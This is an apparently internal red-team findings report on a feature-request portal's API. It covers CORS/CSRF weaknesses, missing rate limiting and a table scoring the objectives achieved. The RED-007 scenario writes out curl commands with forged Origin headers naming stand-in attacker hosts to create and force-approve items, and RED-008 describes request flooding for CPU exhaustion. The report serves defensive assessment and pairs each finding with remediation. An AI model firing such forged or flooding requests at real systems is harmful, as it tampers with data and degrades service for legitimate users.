### RED-007: CORS — Server Processes All Cross-Origin State Changes
- **Severity:** Medium
- **Objective Achieved:** Partial (state changes from arbitrary origins confirmed)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** All `/api/*` endpoints
- **Based On:** PEN-013 (portal equivalent)
- **Exploit Scenario:**
  1. `curl -X POST /api/feature-requests -H "Origin: http://evil.com"` → HTTP 201, item FR-0028 created. Server processes the request despite no CORS grant for `evil.com`.
  2. `curl -X POST /api/feature-requests/FR-XXXX/force-approve -H "Origin: http://evil-attacker.com"` → HTTP 200, `status=approved`. High-privilege state change accepted from attacker origin.
  3. While browsers would block the *response* (no `Access-Control-Allow-Origin: http://evil.com` header), the **server-side effect is already committed** — the item is created/approved before the browser ever checks CORS.
  4. No CSRF token protection exists. Combined with no authentication, a malicious page can trigger state changes directly via `fetch()` — browser blocks the response read, but state mutation already occurred.
- **Recommendation:** CORS misconfiguration is masked by missing auth. Fixing RED-001 (authentication) is the primary remediation. Additionally add CSRF tokens for state-changing operations, or use `SameSite=Strict` cookies once sessions are introduced.

---

### RED-008: No Rate Limiting — Rapid-Fire Endpoint Abuse
- **Severity:** Medium
- **Objective Achieved:** Partial (confirmed no throttling; DoS potential not fully stress-tested in isolated env)
- **Status:** Confirmed (Live Exploit)
- **Target URL:** All `/api/*` endpoints
- **Based On:** PEN-014 (portal equivalent)
- **Exploit Scenario:**
  1. Sent 20 concurrent `POST /api/feature-requests` requests — all returned HTTP 201, zero 429 responses.
  2. No rate-limit middleware registered in `portal/Backend/src/index.ts`.
  3. An attacker can flood the feature backlog with thousands of junk items, degrading signal-to-noise for legitimate users, or trigger expensive operations (voting simulation, duplicate detection via Jaccard similarity over all existing items) at will.
  4. The Jaccard duplicate-detection loop at `createFeatureRequest()` runs `O(n)` per creation — at 10,000 items, each creation compares every title, making bulk creation a CPU exhaustion vector.
- **Recommendation:** Add `express-rate-limit` middleware at the app level with sensible defaults (e.g., 60 requests/minute per IP for write endpoints, stricter for voting/approval). Cap the Jaccard scan or move duplicate detection to an async background job.

---

## Red Team Objectives Coverage

| Config Objective | Red-Team Chain | Result |
|-----------------|---------------|--------|
| Bypass work item state machine to reach an invalid status | RED-001 (force-approve overrides vote majority with zero auth) | **Achieved** |
| Access or modify a soft-deleted work item via direct ID reference | RED-002 (phantom blocker via hard-delete without FK cascade) | **Achieved** |
| Submit a malformed assessment verdict that bypasses routing logic | RED-003 ('denied' not in RESOLVED_STATUSES, cascade never fires) | **Achieved** |
| Enumerate all work items without pagination limit enforcement | RED-005 (limit param ignored, full dataset returned unauthenticated) | **Achieved** |

**Score: 4 / 4 objectives achieved. 7 / 8 exploit chains confirmed as live breaches.**
